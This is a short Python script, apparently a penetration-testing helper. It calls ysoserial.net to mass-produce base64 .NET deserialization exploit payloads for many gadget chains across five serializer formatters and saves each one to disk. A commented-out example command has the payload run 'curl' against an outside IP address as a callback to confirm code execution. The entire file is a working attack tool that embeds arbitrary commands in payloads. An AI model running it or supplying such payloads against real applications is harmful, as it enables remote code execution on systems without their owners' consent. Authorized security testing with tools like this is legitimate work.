import subprocess
import os
import sys

def gen_ysoserial_payloads(cmd, exe_path):
    gadgets = {
        "BinaryFormatter":[
            "ActivitySurrogateDisableTypeCheck",
            "AxHostState",
            "ClaimsIdentity",
            "ClaimsPrincipal",
            "DataSet",
            "DataSetOldBehaviour",
            "DataSetTypeSpoof",
            "GenericPrincipal",
            "PSObject",
            "RolePrincipal",
            "SessionSecurityToken",
            "SessionViewStateHistoryItem",
            "TextFormattingRunProperties",
            "ToolboxItemContainer",
            "TypeConfuseDelegate",
            "WindowsClaimsIdentity",
            "WindowsIdentity"
            ],
        "Json.Net":[
            "ObjectDataProvider",
            "WindowsPrincipal",
            "RolePrincipal",
            "WindowsIdentity",
            "WindowsClaimsIdentity",
            "SessionViewStateHistoryItem",
            "SessionSecurityToken"
        ],
        "SoapFormatter":[
            "ActivitySurrogateDisableTypeCheck",
            "ActivitySurrogateSelector",
            "AxHostState",
            "ClaimsIdentity",
            "ClaimsPrincipal",
            "DataSet",
            "DataSetTypeSpoof",
            "ObjRef",
            "PSObject",
            "RolePrincipal",
            "SessionSecurityToken",
            "SessionViewStateHistoryItem",
            "TextFormattingRunProperties",
            "ToolboxItemContainer",
            "WindowsClaimsIdentity",
            "WindowsIdentity",
            "WindowsPrincipal"

        ],
        "JavaScriptSerializer":[
            "ObjectDataProvider"
        ],
        "XmlSerializer":[
            "ObjectDataProvider"
        ]

    }
    payloads = []
    for formatter in gadgets.keys():
        for g in gadgets[formatter]:
            if g != "":
                #g = g.replace(" ","")
                print("  [ * ]  Generating Payload for Gadget: ", g)
                try:
                    payload = subprocess.run([exe_path, "--formatter", formatter,"-g", g, "-c", cmd, "-o", "base64"],
                                                stdout=subprocess.PIPE,
                                                stderr=subprocess.DEVNULL
                                            ).stdout

                    p = {"formatter":formatter, "gadget":g, "payload":payload } # Casting and removing b'' format from payload

                    payloads.append(p)
                except:
                    print('some kind of error')


    if "payloads" not in os.listdir():
        os.mkdir("payloads")

    for f in gadgets.keys():
        if f not in os.listdir("payloads"):
            os.mkdir("payloads\\"+f)

    for p in payloads:
        fname = "payloads\\" + p["formatter"] + "\\" + p["gadget"]
        print("\n\n",p["gadget"],"\n",p['payload'])
        with open(fname, "w+") as writer:
            writer.write(str(p["payload"])[2:-1]) # Cast and Remove b'' format from payload

if __name__ == "__main__":

    if len(sys.argv) < 2:
        print("Usage: python3",sys.argv[0],"[cmd]  [exe-path]")

    #cmd="curl http://10.83.152.172:8000"
    #exe_path=".\\ysoserial.net\\ysoserial\\bin\\Debug\\ysoserial.exe"
    cmd = sys.argv[1]
    exe_path = sys.argv[2]
    gen_ysoserial_payloads(cmd, exe_path)
